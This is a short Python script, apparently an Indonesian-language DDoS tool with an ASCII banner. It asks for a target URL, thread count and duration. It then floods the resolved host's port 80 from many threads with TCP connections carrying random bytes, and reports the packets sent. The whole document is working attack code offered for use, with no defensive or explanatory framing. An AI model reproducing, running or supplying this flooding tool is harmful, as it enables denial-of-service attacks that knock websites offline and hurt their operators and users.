import socket
import threading
import random
import time
import sys

# Warna ANSI
RED = "\033[91m"
RESET = "\033[0m"

print(f"""{RED}
██╗  ██╗██╗  ██╗██████╗  ██████╗     ██████╗ ██████╗ ██████╗ ███████╗
██║ ██╔╝██║ ██╔╝██╔══██╗██╔═══██╗    ██╔══██╗██╔══██╗██╔══██╗██╔════╝
█████╔╝ █████╔╝ ██████╔╝██║   ██║    ██║  ██║██║  ██║██║  ██║███████╗
██╔═██╗ ██╔═██╗ ██╔══██╗██║   ██║    ██║  ██║██║  ██║██║  ██║╚════██║
██║  ██╗██║  ██╗██║  ██║╚██████╔╝    ██████╔╝██████╔╝██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝     ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝{RESET}
""")

url_target = input("Target URL: ")
num_threads = int(input("Jumlah Threads: "))
duration = int(input("Durasi (detik): "))

target_ip = socket.gethostbyname(url_target)
target_port = 80

packets_sent = 0
is_attacking = True

def attack():
    global packets_sent
    while is_attacking:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            sock.send(random._urandom(1024))
            packets_sent += 1
            sock.close()
        except:
            pass

threads = []
for i in range(num_threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    threads.append(t)
    t.start()

print(f"\n[+] Menyerang {url_target} ({target_ip}) dengan {num_threads} threads")
time.sleep(duration)
is_attacking = False
print(f"\n[+] Selesai. Total packets dikirim: {packets_sent}")